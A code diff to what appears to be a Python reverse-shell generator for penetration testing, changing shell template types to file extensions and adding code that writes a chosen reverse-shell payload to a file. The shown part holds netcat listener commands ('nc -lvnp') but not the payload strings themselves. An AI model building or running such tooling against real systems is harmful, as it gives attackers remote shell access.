@@ -78,7 +78,6 @@ def get_ip(ip_iface: str) -> str:
 def get_shell(ipaddr: str, port: int) -> dict:
     PLAIN = 1
     GENERATE = 2
-    FILE = 3
 
     asp = {
         "description":
@@ -293,7 +292,7 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
         "type":
-        FILE,
+        "php",
         "platform":
         "Generic",
     }
@@ -350,7 +349,7 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
         "type":
-        PLAIN,
+        "py",
         "platform":
         "Linux",
     }
@@ -564,6 +563,13 @@ def main(args: argparse.Namespace) -> None:
     elif shell['type'] == 2:
         path = generate_msf(shell['reverse'])
         path = f"{getcwd()}/{path}"
+        copy_clipboard(path)
+        print(f"[+] Path {path} copied to clipboard")
+    else:
+        path = f"{getcwd()}/reverse.{shell['type']}"
+        with open(path, 'w') as f:
+            f.write(shell['reverse'])
+
         copy_clipboard(path)
         print(f"[+] Path {path} copied to clipboard")
 
